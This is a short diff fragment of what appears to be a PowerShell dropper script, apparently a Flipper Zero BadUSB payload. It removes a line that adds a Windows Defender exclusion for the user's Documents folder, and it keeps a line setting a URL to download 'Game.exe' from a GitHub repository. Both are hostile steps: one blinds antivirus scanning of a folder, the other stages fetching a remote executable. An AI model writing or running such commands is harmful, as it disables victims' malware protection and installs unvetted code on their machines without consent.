@@ -1,5 +1,3 @@
-Add-MpPreference -ExclusionPath "$env:USERPROFILE\Documents"
-
 
 
 $url = "https://github.com/knoxoxen/flipperstuffs/raw/main/Game.exe"
